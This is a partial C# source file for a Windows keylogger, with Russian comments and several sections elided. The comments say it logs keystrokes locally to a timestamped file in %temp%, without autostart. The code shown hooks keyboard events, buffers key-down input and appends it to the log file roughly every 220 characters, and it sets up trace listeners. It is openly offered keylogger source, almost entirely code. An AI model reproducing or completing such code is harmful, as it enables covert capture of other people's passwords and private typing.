/* 
файл лога сохраняется по пути %temp%\data_time(запуска).log
программа не добавляется в автозапуск
файл лога сохраняется только локально
изменения сохраняются/дописываются раз в 220-230 символов
*/
...
namespace Keylogger
{
    class Program
    {
        ...
        //Путь сохранения//
        public static string logName = Path.GetTempPath() + (DateTime.Now).ToString().Replace(":", ".").Replace(" ", "_") + ".log";
        ...
        private static IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            ...
            if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
            {
                ...
                if (s.Length > 220)
                {
                    StreamWriter sw = new StreamWriter(Program.logName, true);
                    sw.Write(s);
                    sw.Close();
                    s = "";
                }
        ...
        static void Main(string[] args)
        {
            ...
            try
            {
                ...
                TextWriterTraceListener lg = new TextWriterTraceListener(Program.logName);

                lg.Name = "LogKeyboard";
                lg.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;

                ConsoleTraceListener trcList = new ConsoleTraceListener(false);

                trcList.TraceOutputOptions = TraceOptions.DateTime;

                Trace.Listeners.Add(lg);
                Trace.Listeners.Add(trcList);
